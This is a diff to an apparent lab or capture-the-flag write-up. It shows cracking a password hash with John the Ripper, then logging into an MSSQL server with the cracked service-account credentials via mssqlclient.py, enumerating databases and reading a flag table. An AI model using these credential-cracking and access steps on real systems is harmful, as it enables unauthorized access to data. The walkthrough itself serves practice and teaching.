@@ -221,6 +221,44 @@ I copied the hash into a file and used John The Ripper to crack it:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-
 [![Screenshot-2025-02-26-095259.png](https://i.postimg.cc/wvvhW60Q/Screenshot-2025-02-26-095259.png)](https://postimg.cc/xkwJ8SrX)
 
+*  **Enumerate the "flagDB" database and submit a flag as your answer.**
+
+After acquiring the mssqlsvc password, I proceeded to log into the MSSQL server using those credentials.
+
+```bash
+mssqlclient.py -p 1433 -windows-auth mssqlsvc@10.129.80.163
+```
+
+Once logged in, I enumerated the available databases using the enum_db command:
+
+```bash
+SQL (WIN-02\mssqlsvc guest@master)> enum_db
+name      is_trustworthy_on   
+-------   -----------------   
+master                    0   
+tempdb                    0   
+model                     0   
+msdb                      1   
+hmaildb                   0   
+flagDB                    0   
+```
+
+Next, I switched to the flagDB database:
+
+```bash
+SQL (WIN-02\mssqlsvc guest@master)> use flagDB
+```
+
+Then, I queried the tables within flagDB to find the relevant table:
+
+```bash
+SQL (WIN-02\mssqlsvc WINSRV02\mssqlsvc@flagDB)> SELECT name FROM flagDB.sys.tables;
+```
+The table tb_flag was found. Finally, I retrieved the flag from the tb_flag table:
+```bash
+SQL (WIN-02\mssqlsvc WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag;
+```
+
+[![Screenshot-2025-02-26-102903.png](https://i.postimg.cc/wT83bqBc/Screenshot-2025-02-26-102903.png)](https://postimg.cc/SjdynpCJ)
